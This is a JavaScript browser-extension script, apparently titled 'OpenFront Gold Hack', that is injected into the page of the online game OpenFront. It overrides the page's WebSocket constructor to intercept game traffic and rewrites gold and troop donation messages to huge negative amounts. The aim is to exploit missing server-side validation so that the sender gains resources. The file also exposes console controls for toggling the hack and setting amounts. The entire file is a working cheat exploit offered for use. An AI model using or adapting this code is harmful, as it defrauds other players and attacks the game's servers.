// This script is injected directly into the page context
// It has access to the page's JavaScript and can intercept WebSocket connections

(function() {
    'use strict';

    console.log('[OpenFront Gold Hack] Injected script loaded');

    // Configuration
    let hackEnabled = true;
    let customGoldAmount = 999999999;
    let customTroopsAmount = 999999999;
    let webSocketInstance = null;

    // Store original WebSocket
    const OriginalWebSocket = window.WebSocket;

    // Override WebSocket constructor
    window.WebSocket = function(url, protocols) {
        console.log('[OpenFront Gold Hack] WebSocket intercepted:', url);

        const ws = new OriginalWebSocket(url, protocols);
        webSocketInstance = ws;

        // Store original send method
        const originalSend = ws.send.bind(ws);

        // Override send method to intercept outgoing messages
        ws.send = function(data) {
            try {
                const message = JSON.parse(data);
                const modified = modifyClientMessage(message);

                if (modified) {
                    console.log('[OpenFront Gold Hack] Message modified, sending:', modified);
                    return originalSend(JSON.stringify(modified));
                }
            } catch (e) {
                // Not JSON or error, send as-is
            }

            return originalSend(data);
        };

        // Intercept incoming messages
        const originalAddEventListener = ws.addEventListener.bind(ws);
        ws.addEventListener = function(type, listener, options) {
            if (type === 'message') {
                const wrappedListener = function(event) {
                    try {
                        const message = JSON.parse(event.data);
                        console.log('[OpenFront Gold Hack] Server message:', message.type);

                        // Try to modify server messages
                        const modified = modifyServerMessage(message);
                        if (modified) {
                            // Create new event with modified data
                            const modifiedEvent = new MessageEvent('message', {
                                data: JSON.stringify(modified),
                                origin: event.origin,
                                lastEventId: event.lastEventId,
                                source: event.source,
                                ports: event.ports
                            });
                            return listener.call(this, modifiedEvent);
                        }
                    } catch (e) {
                        // Not JSON, pass through
                    }

                    return listener.call(this, event);
                };
                return originalAddEventListener(type, wrappedListener, options);
            }
            return originalAddEventListener(type, listener, options);
        };

        return ws;
    };

    // Copy prototype
    window.WebSocket.prototype = OriginalWebSocket.prototype;
    window.WebSocket.CONNECTING = OriginalWebSocket.CONNECTING;
    window.WebSocket.OPEN = OriginalWebSocket.OPEN;
    window.WebSocket.CLOSING = OriginalWebSocket.CLOSING;
    window.WebSocket.CLOSED = OriginalWebSocket.CLOSED;

    function modifyClientMessage(message) {
        if (!hackEnabled) return null;

        const type = message.type;

        // Intercept intent messages
        if (type === 'intent' && message.intent) {
            const intent = message.intent;
            const intentType = intent.type;

            // Method 1: Intercept donate_gold and try negative gold exploit
            if (intentType === 'donate_gold') {
                console.warn('[OpenFront Gold Hack] 🎯 INTERCEPTING DONATE_GOLD!');
                console.warn('[OpenFront Gold Hack]    Original gold:', intent.gold);

                // Try multiple exploit techniques:

                // Technique 1: Negative gold (might cause receiving player to LOSE gold, sender to GAIN)
                // Technique 2: Very large number (test integer overflow)
                // Technique 3: Float/decimal (test type confusion)
                // Technique 4: Null (triggers default behavior, might bypass validation)

                // Let's try negative gold first
                intent.gold = -customGoldAmount;

                console.warn('[OpenFront Gold Hack]    💉 Modified to:', intent.gold);
                console.warn('[OpenFront Gold Hack]    📡 Attempting exploit...');

                return message;
            }

            if (intentType === 'donate_troops') {
                console.warn('[OpenFront Gold Hack] 🎯 INTERCEPTING DONATE_TROOPS!');
                intent.troops = -customTroopsAmount;
                return message;
            }
        }

        return null; // No modification
    }

    function modifyServerMessage(message) {
        if (!hackEnabled) return null;

        // We could modify incoming game state updates here
        // But server validation makes this less useful

        return null;
    }

    // Expose functions for extension popup
    window.__openFrontHack = {
        enabled: hackEnabled,
        customGold: customGoldAmount,
        customTroops: customTroopsAmount,

        setEnabled: function(enabled) {
            hackEnabled = enabled;
            console.log('[OpenFront Gold Hack] Hack', enabled ? 'ENABLED' : 'DISABLED');
        },

        setGold: function(amount) {
            customGoldAmount = amount;
            console.log('[OpenFront Gold Hack] Gold set to:', amount);
        },

        setTroops: function(amount) {
            customTroopsAmount = amount;
            console.log('[OpenFront Gold Hack] Troops set to:', amount);
        },

        getStatus: function() {
            return {
                enabled: hackEnabled,
                gold: customGoldAmount,
                troops: customTroopsAmount,
                wsConnected: webSocketInstance !== null && webSocketInstance.readyState === WebSocket.OPEN
            };
        },

        // Direct gold injection attempt (for singleplayer)
        injectGold: async function() {
            console.log('[OpenFront Gold Hack] Attempting direct gold injection...');

            // Try to find the game instance in memory
            // This works in singleplayer where game runs locally

            // Method 1: Look for exposed game objects
            if (window.gameRunner || window.game || window.gameInstance) {
                console.log('[OpenFront Gold Hack] Found game instance!');
                // Try to modify it directly
                return true;
            }

            // Method 2: Send fake server messages
            if (webSocketInstance && webSocketInstance.readyState === WebSocket.OPEN) {
                console.log('[OpenFront Gold Hack] Attempting to inject fake server message...');

                // This likely won't work due to server validation
                // But worth trying for testing

                return false;
            }

            console.error('[OpenFront Gold Hack] Could not inject gold - no attack vector found');
            return false;
        }
    };

    console.log('[OpenFront Gold Hack] Injection complete!');
    console.log('[OpenFront Gold Hack] WebSocket interception active');
    console.log('[OpenFront Gold Hack] Use window.__openFrontHack for controls');

})();
